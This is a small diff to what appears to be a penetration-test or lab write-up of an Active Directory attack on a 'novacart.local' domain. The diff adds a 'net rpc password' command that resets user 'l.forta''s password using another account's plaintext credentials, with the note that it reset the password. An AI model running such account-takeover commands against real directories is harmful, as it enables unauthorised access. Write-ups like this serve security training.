@@ -1468,5 +1468,10 @@ modifying rdn of entry "CN=LUIS FORTA,OU=SENIOR DEV OPS,DC=NOVACART,DC=LOCAL"
 This will have moved the user
 
 ```python
+net rpc password "l.forta" 'Password123!' -U "novacart.local"/"cliff.b"%'Password123!' -S "10.0.18.23"
+```
+This has reset the password
+
+```python
 
 ```
